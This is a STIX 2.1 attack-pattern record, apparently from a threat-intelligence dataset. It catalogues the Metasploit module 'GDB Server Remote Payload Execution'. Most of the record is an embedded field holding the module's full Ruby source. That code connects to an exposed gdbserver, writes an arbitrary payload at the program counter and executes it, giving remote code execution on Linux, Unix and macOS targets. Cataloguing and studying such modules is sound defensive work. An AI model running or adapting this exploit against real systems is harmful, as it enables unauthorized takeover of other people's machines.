{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--28c6116e-52af-4ff4-80df-a21568775709",
    "created": "2024-08-14T17:05:19.218565Z",
    "modified": "2024-08-14T17:05:19.218569Z",
    "name": "GDB Server Remote Payload Execution",
    "description": " This module attempts to execute an arbitrary payload on a loose gdbserver service. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/gdb/gdb_server_exec.rb",
            "external_id": "gdb_server_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/3691"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Gdb\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GDB Server Remote Payload Execution',\n        'Description' => %q{\n          This module attempts to execute an arbitrary payload on a loose gdbserver service.\n        },\n        'Author' => [ 'joev' ],\n        'Targets' => [\n          [ 'x86', { 'Arch' => ARCH_X86 } ],\n          [ 'x86_64', { 'Arch' => ARCH_X64 } ],\n          [ 'ARMLE', { 'Arch' => ARCH_ARMLE } ],\n          [ 'AARCH64', { 'Arch' => ARCH_AARCH64 } ],\n        ],\n        'References' => [\n          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/3691']\n        ],\n        'DisclosureDate' => '2014-08-24',\n        'Platform' => %w[linux unix osx],\n        'Arch' => [ARCH_X86, ARCH_X64, ARCH_ARMLE, ARCH_AARCH64],\n        'Notes' => {\n          'SideEffects' => [IOC_IN_LOGS],\n          'Stability' => [CRASH_SERVICE_DOWN, SERVICE_RESOURCE_LOSS],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PrependFork' => true\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('EXE_FILE', [\n        false,\n        'The exe to spawn when gdbserver is not attached to a process.',\n        '/bin/true'\n      ])\n    ])\n  end\n\n  def exploit\n    connect\n\n    print_status('Performing handshake with gdbserver...')\n    handshake\n\n    res = enable_extended_mode\n    if res !~ /OK/\n      fail_with(Failure::UnexpectedReply, 'Could not enable extended mode.')\n    end\n\n    begin\n      print_status('Stepping program to find PC...')\n      gdb_data = process_info\n    rescue BadAckError, BadResponseError\n      # gdbserver is running with the --multi flag and is not currently\n      # attached to any process. let's attach to /bin/true or something.\n      print_status(\"No process loaded, attempting to load #{datastore['EXE_FILE']}...\")\n      res = run_file(datastore['EXE_FILE'])\n      if res !~ /OK/\n        fail_with(Failure::UnexpectedReply, 'Could not load new program.')\n      end\n      gdb_data = process_info\n    end\n\n    gdb_pc, gdb_arch = gdb_data.values_at(:pc, :arch)\n\n    unless payload.arch.include?(gdb_arch)\n      fail_with(Failure::BadConfig, \"The payload architecture is incorrect: the payload is #{payload.arch.first}, but #{gdb_arch} was detected from gdb.\")\n    end\n\n    print_status(\"Writing payload at #{gdb_pc}...\")\n    write(payload.encoded, gdb_pc)\n\n    print_status('Executing the payload...')\n    continue({read: false})\n  ensure\n    disconnect if sock\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-08-24",
    "x_mitre_platforms": [
        "%w[linux unix osx]"
    ]
}